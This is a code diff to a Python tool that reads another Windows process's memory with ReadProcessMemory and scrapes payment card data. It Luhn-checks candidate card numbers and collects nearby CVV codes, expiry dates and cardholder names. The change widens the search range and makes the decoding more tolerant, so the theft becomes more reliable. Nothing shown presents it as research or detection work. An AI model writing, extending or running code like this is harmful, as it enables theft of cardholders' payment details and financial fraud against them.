@@ -45,18 +45,23 @@ def scan_memory_chunk(memory_chunk):
         if validate_luhn(sanitized_card):
             # Try to find associated CVV, expiry date, and name near the card
             match_index = memory_chunk.find(card_match)
-            surrounding_text = memory_chunk[max(0, match_index - 100): match_index + 300]
+            surrounding_text = memory_chunk[max(0, match_index - 200): match_index + 400]  # Extended search range
 
             # Find possible CVV, expiry date, and name nearby
-            cvv_match = cvv_regex.search(surrounding_text)
-            expiry_match = expiry_regex.search(surrounding_text)
-            name_match = name_regex.search(surrounding_text)
+            cvv_match = cvv_regex.findall(surrounding_text)
+            expiry_match = expiry_regex.findall(surrounding_text)
+            name_matches = name_regex.findall(surrounding_text)
+
+            # Use the first matches found
+            cvv = cvv_match[0] if cvv_match else 'Not Found'
+            expiry = expiry_match[0] if expiry_match else 'Not Found'
+            name = name_matches[0] if name_matches else 'Not Found'
 
             card_info = {
                 'Card Number': sanitized_card,
-                'CVV': cvv_match.group(0) if cvv_match else 'Not Found',
-                'Expiry Date': expiry_match.group(0) if expiry_match else 'Not Found',
-                'Name': name_match.group(0) if name_match else 'Not Found'
+                'CVV': cvv,
+                'Expiry Date': expiry,
+                'Name': name
             }
             results.append(card_info)
 
@@ -70,7 +75,7 @@ def memory_scan_worker(process_handle):
             buffer = ctypes.create_string_buffer(size)
             bytesRead = ctypes.c_size_t(0)
             if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
-                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1'))
+                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                 if valid_cards:
                     for card in valid_cards:
                         # Format the output as requested
